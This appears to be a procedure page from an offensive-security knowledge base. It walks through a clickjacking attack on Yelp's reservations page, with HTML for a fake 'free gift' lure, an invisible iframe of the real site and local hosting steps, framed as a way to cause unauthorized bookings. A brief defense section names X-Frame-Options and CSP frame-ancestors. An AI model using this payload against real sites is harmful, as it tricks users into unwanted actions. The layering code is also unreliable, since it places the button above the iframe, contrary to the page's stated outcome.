---
tags:
  - clickjacking
  - iframe
  - embedding
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:28:12.806Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: f3b7d6ab-7592-4812-abac-83d19137a88b
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Embed-Target-Page-in-Invisible-Iframe

## Summary

This procedure demonstrates how to embed a vulnerable web page, such as Yelp's /reservations, into an invisible iframe on a malicious site to facilitate clickjacking attacks.

## Description

Clickjacking relies on framing a target page without anti-framing protections. By positioning an iframe invisibly over legitimate content, attackers can capture user interactions intended for the visible site but executed on the hidden framed page. For Yelp, this allows overlaying a fake button that submits reservation forms, leading to unauthorized bookings. Prerequisites include a hosting environment for the malicious page and confirmed vulnerability from header inspection.

## Requirements

1. Local or remote web server to host the malicious HTML page
2. Confirmed absence of X-Frame-Options on the target URL
3. HTML and CSS knowledge for positioning

## Defense

Defensive measures and detection strategies:

- Enforce X-Frame-Options header to prevent framing
- Deploy CSP with frame-ancestors 'none' or specific origins
- Detect anomalous iframe usage via client-side JavaScript monitoring

## Objectives

1. Successfully load the target page within an iframe
2. Hide the iframe to enable UI manipulation
3. Prepare for victim interaction without detection

## Instructions

### Step 1: Create the Malicious HTML Page

**Context**: Build the base structure for the attack page.

Create an HTML file (e.g., index.html) with a visible clickable element, such as a button promising a reward.

```html
<!DOCTYPE html>
<html>
<head><title>Free Reservation</title></head>
<body>
  <button id="trick">Click for Free Gift</button>
</body>
</html>
```

**Expected Output**: A simple page with a button.

### Step 2: Add and Position the Iframe

**Context**: Embed and hide the target page to align interactions.

Insert an iframe targeting the vulnerable URL, set opacity to 0, and position it absolutely over the button using CSS.

```html
<iframe id="hidden" src="https://www.yelp.com/reservations" style="position:absolute; top:0; left:0; opacity:0; width:100%; height:100%; z-index:1;"></iframe>
<button id="trick" style="position:relative; z-index:2;">Click for Free Gift</button>
```

**Expected Output**: Iframe loads invisibly; clicking the button interacts with the framed page.

### Step 3: Host and Test the Page

**Context**: Serve the page and verify embedding.

Use a local server (e.g., python -m http.server 8000) and access http://localhost:8000. Confirm the iframe loads without errors.

**Expected Output**: Yelp page embedded and hidden successfully.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[clickjacking]]
- [[iframe]]
- [[embedding]]
